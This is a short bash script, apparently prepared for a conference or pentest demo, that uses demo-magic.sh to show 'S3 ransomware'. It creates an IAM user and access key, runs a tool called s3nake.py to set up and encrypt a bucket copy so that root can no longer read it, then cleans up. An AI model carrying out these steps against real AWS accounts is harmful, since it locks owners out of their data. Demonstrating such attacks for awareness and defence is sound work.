#!/bin/bash

########################
# include the magic
########################
. demo-magic.sh #clone it

# hide the evidence
clear

export DEMO_PROMPT="\033[1;32m🪣 S3 ransomware demo \033[1;34m:: \033[1;32m~/pentest/demo » \033[0m"
#export env var for aws

# Create user (explain that this is to have profile that only you can access, root is shared and can also be restricted) + in admin group
pei "aws iam create-user --user-name [USER]"
pei "aws iam remove-user-from-group --group-name Admin --user-name [USER]"
pei "aws iam create-access-key --user-name [USER]"

##TODO: add access key in config

# s3 ransomware checks
pei "python s3nake.py check -p [USER] -r eu-west-3"
# s3 ransomware setup 
pei "python s3nake.py setup -p [USER] -b [BUCKET_NAME] -r eu-west-3"
# get file with root
pei "aws s3api get-object --profile root.dev --bucket [BUCKET_NAME]-cpy --key [KEY] test1"
# is3 ransomware encrypt
pei "python s3nake.py encrypt -p [USER] -b [BUCKET_NAME]-cpy -r eu-west-3"

# try accessing object/reading with root
pei "aws --profile [USER] s3api list-objects --bucket [BUCKET_NAME]-cpy" 
pei "aws s3api get-object --profile [USER] --bucket [BUCKET_NAME]-cpy --key [KEY] test2"
pei "aws s3api get-object --profile [OTHER-USER/ROOT] --bucket [BUCKET_NAME]-cpy --key [KEY] test3"

# try using KMS with root

# clean
pei "python s3nake.py clean -p [USER] -b [BUCKET_NAME]-cpy -r eu-west-3"
#aws iam remove-user-from-group --group-name Admin --user-name [USER]
#aws iam delete-access-key --user-name [USER]--access-key-id [ACCESS_KEY_ID]
#aws iam delete-user --user-name [USER]



p "💥🎉 You reach end of demo and encrypt a S3 Bucket that only you could decrypt!"
clear
